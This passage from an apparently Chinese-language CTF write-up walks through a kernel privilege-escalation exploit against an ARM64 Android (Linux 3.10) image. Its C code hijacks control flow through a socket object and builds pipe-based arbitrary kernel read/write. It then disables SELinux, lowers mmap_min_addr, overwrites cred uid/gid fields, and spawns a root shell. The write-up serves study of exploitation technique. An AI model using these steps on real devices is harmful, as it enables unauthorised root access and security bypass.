<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)((<span class="keyword">char</span>*)payload + <span class="number">0x290</span>) = <span class="number">0</span>;</span><br><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)((<span class="keyword">char</span>*)payload) = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)<span class="number">0xFFFFFFC00035D788</span>;</span><br><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)((<span class="keyword">char</span>*)payload + <span class="number">0x28</span>) = payload;</span><br><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)((<span class="keyword">char</span>*)payload + <span class="number">0x68</span>) = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)<span class="number">0xFFFFFFC00035D7C0</span>;</span><br><span class="line">close(exp_sock);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] now we can R/W kernel address space like a boss.\n&quot;</span>);</span><br></pre></td></tr></table></div></figure></li>
<li><p>通过pipe系统调用，任意读写内核</p>
<p>封装两个函数，用户态程序通过调用它们，就能实现对任意内核地址的读写。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">kernel_read</span><span class="params">(<span class="keyword">void</span>* kernel_addr, <span class="keyword">unsigned</span> <span class="keyword">long</span>* value, usigned <span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> pipefd[<span class="number">2</span>];</span><br><span class="line">	pipe(pipefd);</span><br><span class="line">	write(pipe[<span class="number">1</span>],kernel_addr,len);</span><br><span class="line">	read(pipe[<span class="number">0</span>],value,len);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">kernel_write</span><span class="params">(<span class="keyword">void</span>* kernel_addr, <span class="keyword">unsigned</span> <span class="keyword">long</span>* value, usigned <span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> pipefd[<span class="number">2</span>];</span><br><span class="line">	pipe(pipefd);</span><br><span class="line">	write(pipe[<span class="number">1</span>],value,len);</span><br><span class="line">	read(pipe[<span class="number">0</span>],kernel_addr,len);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
<p>该步骤的源码参考：<a href="step2.c">步骤二的源码</a></p>
</li>
</ul>
<p>选择内核数据段0xFFFFFFC000580860，写入0xdeadbeefdeadbeef，并成功读出。效果如下图所示：</p>
<p><img   src="image-20220918193452306.png?size=600" style="width: 600px;"  alt="image-20220918193452306"></p>

        <h2 id="步骤3-关闭selinux"   >
          <a href="#步骤3-关闭selinux" class="heading-link"><i class="fas fa-link"></i></a><a href="#步骤3-关闭selinux" class="headerlink" title="步骤3. 关闭selinux"></a>步骤3. 关闭selinux</h2>
      <p>通过<code>sel_read_enforce()</code>函数，可以定位到<code>selinux_enforcing</code>的地址，为0xFFFFFFC00065399C。</p>
<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall sel_read_enforce(__int64 a1, __int64 a2, __int64 a3, __int64 a4)</span><br><span class="line">&#123;</span><br><span class="line">  int v7; &#x2F;&#x2F; w0</span><br><span class="line">  _BYTE v9[16]; &#x2F;&#x2F; [xsp+30h] [xbp+30h] BYREF</span><br><span class="line"></span><br><span class="line">  v7 &#x3D; scnprintf(v9, 12i64, &quot;%d&quot;, MEMORY[0xFFFFFFC00065399C]);</span><br><span class="line">    &#x2F;&#x2F;0xFFFFFFC00065399C即selinux_enforcing</span><br><span class="line">  return simple_read_from_buffer(a2, a3, a4, v9, v7);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
<p>通过如下代码片段实现关闭selinux：</p>
<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unsigned int set_selinux &#x3D; 0;</span><br><span class="line">kernel_write((void*)0xFFFFFFC00065399C,&amp;set_selinux,4);</span><br></pre></td></tr></table></div></figure>
<p>该步骤的源码参考：<a href="step3.c">步骤三的源码</a></p>
<p>先读取selinux_enforcing的值，为1，表示开启了selinux。然后设置selinux_enforcing为0，并读取，发现设置成功。效果如下图所示：</p>
<p><img   src="image-20220918200706532.png?size=600" style="width: 600px;"  alt="image-20220918200706532"></p>

        <h2 id="步骤4-获取cred-real-cred地址"   >
          <a href="#步骤4-获取cred-real-cred地址" class="heading-link"><i class="fas fa-link"></i></a><a href="#步骤4-获取cred-real-cred地址" class="headerlink" title="步骤4. 获取cred/real_cred地址"></a>步骤4. 获取cred/real_cred地址</h2>
      <p>为了给当前进程提权，需要改cred结构体的信息。因此，先获取task_struct结构体的地址，再通过偏移定位到cred的存放地址。</p>
<ul>
<li><p>泄露<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v3.10.108/source/include/linux/sched.h#L1041" >task_struct结构体</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>的地址</p>
<p>task_struct的地址在<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v3.10.108/source/arch/arm64/include/asm/thread_info.h#L46" >thread_info结构体</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>中存储着，而thread_info结构体地址跟内核栈地址是相同的。arm64系统上，内核栈的最大深度为16K。<code>sp&amp;0xFFFFFFFFFFFFC000</code>即可得到thread_info的地址，task_struct在thread_info结构体中的偏移是0x10。</p>
<p>本题Image中，找到如下代码片段，可通过<code>sp&amp;0xFFFFFFFFFFFFC000</code>计算将task_struct的地址写到<code>X1+0x18</code>地址处。</p>
<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># mutex_trylock函数</span><br><span class="line">ROM:FFFFFFC0004AA518                 MOV             X2, SP</span><br><span class="line">ROM:FFFFFFC0004AA51C                 AND             X2, X2, #0xFFFFFFFFFFFFC000</span><br><span class="line">ROM:FFFFFFC0004AA520                 LDR             X2, [X2,#0x10]</span><br><span class="line">ROM:FFFFFFC0004AA524                 STR             X2, [X1,#0x18]</span><br><span class="line">ROM:FFFFFFC0004AA528                 RET</span><br></pre></td></tr></table></div></figure>
<p>由于控制流劫持时，x1寄存器中的值为0，因此task_struct的地址将被写入0x18地址处。</p>
<p>那么需要提前mmap小于4096的地址，而系统通常会禁止mmap低地址，所以需要改mmap_min_addr的值，将其改成0。通过逆向Image镜像，可以找到mmap_min_addr的值为0xFFFFFFC000652148。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">mmap_min_addr_handler</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// x0</span></span><br><span class="line"></span><br><span class="line">  result = proc_doulongvec_minmax();</span><br><span class="line">  MEMORY[<span class="number">0xFFFFFFC000652148</span>] = <span class="number">4096</span>i64;			<span class="comment">// 0xFFFFFFC000652148就是mmap_min_addr的地址</span></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
<p>读取task_struct地址的代码如下：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// set mmap_min_addr</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> set_mmap_min = <span class="number">0</span>;</span><br><span class="line">kernel_write((<span class="keyword">void</span>*)<span class="number">0xFFFFFFC000652148</span>,&amp;set_mmap_min,<span class="number">8</span>);</span><br><span class="line">user_mm = mmap((<span class="keyword">void</span>*)<span class="number">0x0</span>,PAGE_SIZE,PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE| MAP_FIXED |MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">  </span><br><span class="line"><span class="comment">// leak struct_cred address to 0x18</span></span><br><span class="line">exp_sock = search_exploitable_socket(&amp;exp_sock_index,&amp;payload);</span><br><span class="line"><span class="keyword">if</span>(exp_sock == <span class="number">-1</span>)&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;cannot find target socket\n&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;find it 2!!! exp_sock_index: 0x%x\n&quot;</span>,exp_sock_index);</span><br><span class="line">&#125;</span><br><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)((<span class="keyword">char</span>*)payload + <span class="number">0x290</span>) = <span class="number">0</span>;</span><br><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)((<span class="keyword">char</span>*)payload) = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)<span class="number">0xFFFFFFC0004AA518</span>;</span><br><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)((<span class="keyword">char</span>*)payload + <span class="number">0x28</span>) = payload;</span><br><span class="line">close(exp_sock);</span><br><span class="line">  </span><br><span class="line"><span class="comment">// read task_struct address</span></span><br><span class="line"><span class="keyword">void</span>* task_struct_addr = <span class="number">0</span>;</span><br><span class="line">task_struct_addr = (<span class="keyword">void</span>*)*(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)((<span class="keyword">char</span>*)user_mm+<span class="number">0x18</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;task_struct addr is : %p\n&quot;</span>,task_struct_addr);</span><br></pre></td></tr></table></div></figure></li>
<li><p>泄露cred/real_cred地址</p>
<p>根据cred/real_cred在task_struct中的偏移，获取cred/real_cred结构体的地址。</p>
<p>上一步获得了<code>task_struct task</code>的地址，通过<code>exit_creds()</code>函数得知task-&gt;real_cred的偏移是0x398。（<code>real_cred</code> 与 <code>cred</code> 指向的位置是相同的）</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// IDA伪代码</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> *__fastcall <span class="title">exit_creds</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> *v2; <span class="comment">// x0</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// w1</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// w1</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> *result; <span class="comment">// x0</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// w1</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v7; <span class="comment">// w1</span></span><br><span class="line"></span><br><span class="line">  v2 = *(<span class="keyword">unsigned</span> <span class="keyword">int</span> **)(a1 + <span class="number">0x398</span>);</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">0x398</span>) = <span class="number">0</span>i64;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v3 = __ldaxr(v2);</span><br><span class="line">    v4 = v3 - <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// C源代码</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">exit_creds</span><span class="params">(struct task_struct *tsk)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">cred</span>;</span></span><br><span class="line">	cred = (struct cred *) tsk-&gt;real_cred;</span><br><span class="line">	tsk-&gt;real_cred = <span class="literal">NULL</span>;</span><br><span class="line">	validate_creds(cred);</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
<p>所以，通过我们封装的内核任意地址读函数，real_cred的地址，代码片段如下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span>* cred_addr = <span class="number">0</span>;</span><br><span class="line">kernel_read((<span class="keyword">char</span>*)task_struct_addr+<span class="number">0x398</span>,&amp;cred_addr,<span class="number">8</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;cred addr: %p\n&quot;</span>,cred_addr);</span><br></pre></td></tr></table></div></figure>
<p>该步骤的源码参考：<a href="step4.c">步骤四的源码</a></p>
</li>
</ul>
<p>运行结果如下图所示，成功泄露了task_struct和cred结构体的地址。</p>
<p><img   src="image-20220920175812155.png?size=600" style="width: 600px;"  alt="image-20220920175812155"></p>

        <h2 id="步骤5-进程提权"   >
          <a href="#步骤5-进程提权" class="heading-link"><i class="fas fa-link"></i></a><a href="#步骤5-进程提权" class="headerlink" title="步骤5. 进程提权"></a>步骤5. 进程提权</h2>
      <p>获取到cred/real_cred结构体的地址后，剩下的事情就变得简单了。</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v3.10.108/source/include/linux/cred.h#L103" >cred结构体</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>如下，将<code>uid,gid,suid,sgid,euid,egid,fsuid,fsgid</code>全都改成0，即可完成本进程的提权。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">	<span class="keyword">atomic_t</span>	usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">	<span class="keyword">atomic_t</span>	subscribers;	<span class="comment">/* number of processes subscribed */</span></span><br><span class="line">	<span class="keyword">void</span>		*put_addr;</span><br><span class="line">	<span class="keyword">unsigned</span>	magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC	0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD	0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">kuid_t</span>		uid;		<span class="comment">/* real UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		gid;		<span class="comment">/* real GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		suid;		<span class="comment">/* saved UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		sgid;		<span class="comment">/* saved GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		euid;		<span class="comment">/* effective UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		egid;		<span class="comment">/* effective GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		fsuid;		<span class="comment">/* UID for VFS ops */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		fsgid;		<span class="comment">/* GID for VFS ops */</span></span><br><span class="line">	<span class="comment">// ......</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>
<p>本部分代码片段如下：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// set cred to get root</span></span><br><span class="line"><span class="keyword">int</span> a = <span class="number">0</span>;</span><br><span class="line">kernel_write((<span class="keyword">char</span>*)cred_addr+<span class="number">4</span>,&amp;a,<span class="number">4</span>);</span><br><span class="line">kernel_write((<span class="keyword">char</span>*)cred_addr+<span class="number">8</span>,&amp;a,<span class="number">4</span>);</span><br><span class="line">kernel_write((<span class="keyword">char</span>*)cred_addr+<span class="number">12</span>,&amp;a,<span class="number">4</span>);</span><br><span class="line">kernel_write((<span class="keyword">char</span>*)cred_addr+<span class="number">16</span>,&amp;a,<span class="number">4</span>);	</span><br><span class="line">kernel_write((<span class="keyword">char</span>*)cred_addr+<span class="number">20</span>,&amp;a,<span class="number">4</span>);</span><br><span class="line">kernel_write((<span class="keyword">char</span>*)cred_addr+<span class="number">24</span>,&amp;a,<span class="number">4</span>);</span><br><span class="line">kernel_write((<span class="keyword">char</span>*)cred_addr+<span class="number">28</span>,&amp;a,<span class="number">4</span>);</span><br><span class="line">kernel_write((<span class="keyword">char</span>*)cred_addr+<span class="number">32</span>,&amp;a,<span class="number">4</span>);	</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(getuid() == <span class="number">0</span>)&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;now the uid is 0\n&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;failed\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
<p>该步骤的源码参考：<a href="step5.c">步骤五的源码</a></p>
<p><img   src="image-20220920182949779.png?size=600" style="width: 600px;"  alt="image-20220920182949779"></p>

        <h2 id="步骤6-稳定shell"   >
          <a href="#步骤6-稳定shell" class="heading-link"><i class="fas fa-link"></i></a><a href="#步骤6-稳定shell" class="headerlink" title="步骤6. 稳定shell"></a>步骤6. 稳定shell</h2>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://tuxthink.blogspot.com/2012/05/module-to-print-open-files-of-process.html" >Module to print the open files of a process</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>task_struct-&gt;files-&gt;fdt-&gt;max_fds存储着当前进程打开的文件个数信息（猜测当进程退出时会根据该信息，依次关闭各个打开的文件）。为防止其他socket关闭时crash，我们需要将该值改为0。</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v3.10.108/source/include/linux/fdtable.h#L45" >files_struct结构体</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<ul>
<li><p>确定<code>files_struct *files</code>在<code>tast_struct</code>中的偏移</p>
<p><code>get_files_struct()</code>函数中通过使用了files_struct，通过比对，得到本题中files_struct在tast_struct中的偏移量为0x788字节。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在linux 3.10的源码中找到如下函数，调用了task-&gt;files</span></span><br><span class="line"><span class="function">struct files_struct *<span class="title">get_files_struct</span><span class="params">(struct task_struct *task)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">files_struct</span> *<span class="title">files</span>;</span></span><br><span class="line"></span><br><span class="line">	task_lock(task);</span><br><span class="line">	files = task-&gt;files;</span><br><span class="line">	<span class="keyword">if</span> (files)</span><br><span class="line">		atomic_inc(&amp;files-&gt;count);</span><br><span class="line">	task_unlock(task);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> files;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 在Image中找到对应的伪代码，确认files在task_struct中的偏移量是0x788</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> *__fastcall <span class="title">get_files_struct</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// x20</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> *v3; <span class="comment">// x19</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// w0</span></span><br><span class="line"></span><br><span class="line">  v2 = a1 + <span class="number">0x818</span>;</span><br><span class="line">  raw_spin_lock(a1 + <span class="number">0x818</span>);</span><br><span class="line">  v3 = *(<span class="keyword">unsigned</span> <span class="keyword">int</span> **)(a1 + <span class="number">0x788</span>);		<span class="comment">// files = task-&gt;files</span></span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      v4 = __ldxr(v3);</span><br><span class="line">    <span class="keyword">while</span> ( __stxr(v4 + <span class="number">1</span>, v3) );</span><br><span class="line">  &#125;</span><br><span class="line">  raw_spin_unlock(v2);</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure></li>
<li><p>确定<code>fdtable *fdt</code>在<code>files_struct</code>中的偏移</p>
<p><code>do_dup2()</code>函数中使用到了fdt，如下代码段。所以本题环境中，<code>fdtable *fdt</code>在<code>files_struct</code>中的偏移量为8字节。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 源码</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">do_dup2</span><span class="params">(struct files_struct *files,</span></span></span><br><span class="line"><span class="function"><span class="params">	struct file *file, <span class="keyword">unsigned</span> fd, <span class="keyword">unsigned</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">tofree</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fdtable</span> *<span class="title">fdt</span>;</span></span><br><span class="line">	fdt = files_fdtable(files);</span><br><span class="line">	tofree = fdt-&gt;fd[fd];</span><br><span class="line">	<span class="comment">// ......</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// IDA伪代码</span></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">do_dup2</span><span class="params">(__int64 a1, __int64 a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// ......</span></span><br><span class="line">  v5 = <span class="number">8</span>i64 * (<span class="keyword">unsigned</span> <span class="keyword">int</span>)a3;</span><br><span class="line">  v6 = *(_QWORD **)(a1 + <span class="number">8</span>);	<span class="comment">//从file_struct偏移8字节的位置，取出fdt的地址</span></span><br><span class="line">  v7 = *(_QWORD *)(v6[<span class="number">1</span>] + v5);</span><br><span class="line">  <span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
<p>根据以上信息，可通过如下代码片段，清理打开的socket fd，避免内核crash。</p>
</li>
</ul>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// clean fds</span></span><br><span class="line"><span class="keyword">void</span>* files_struct_addr = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">void</span>* fdtable_addr = <span class="number">0</span>;</span><br><span class="line">kernel_read((<span class="keyword">char</span>*)task_struct_addr+<span class="number">0x788</span>,&amp;files_struct_addr,<span class="number">8</span>);</span><br><span class="line">kernel_read((<span class="keyword">char</span>*)files_struct_addr+<span class="number">8</span>,&amp;fdtalbe_addr,<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">kernel_write(fdtable_addr,&amp;a,<span class="number">4</span>);</span><br></pre></td></tr></table></div></figure>
<p>弹root shell</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// root shell</span></span><br><span class="line"><span class="keyword">if</span>(getuid() == <span class="number">0</span>)&#123;</span><br><span class="line">	system(<span class="string">&quot;/system/bin/sh&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;failed\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
<p>完整利用代码：<a href="step6.c">步骤六源码</a></p>
<p>效果如下：</p>
<p><img   src="image-20220921123726416.png?size=600" style="width: 600px;"  alt="image-20220921123726416"></p>

        <h1 id="知识点补充"   >
          <a href="#知识点补充" class="heading-link"><i class="fas fa-link"></i></a><a href="#知识点补充" class="headerlink" title="知识点补充"></a>知识点补充</h1>
      <blockquote>
<p>学习本题exp的过程中，补了不少知识点，全都记录在这里</p>
</blockquote>

        <h2 id="linux-rlimit资源限制"   >
          <a href="#linux-rlimit资源限制" class="heading-link"><i class="fas fa-link"></i></a><a href="#linux-rlimit资源限制" class="headerlink" title="linux rlimit资源限制"></a>linux rlimit资源限制</h2>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/rikeyone/article/details/88798384" >Linux rlimit 函数详解</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/niocai/archive/2012/04/01/2428128.html" >Linux系统调用–getrlimit()与setrlimit()函数详解</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
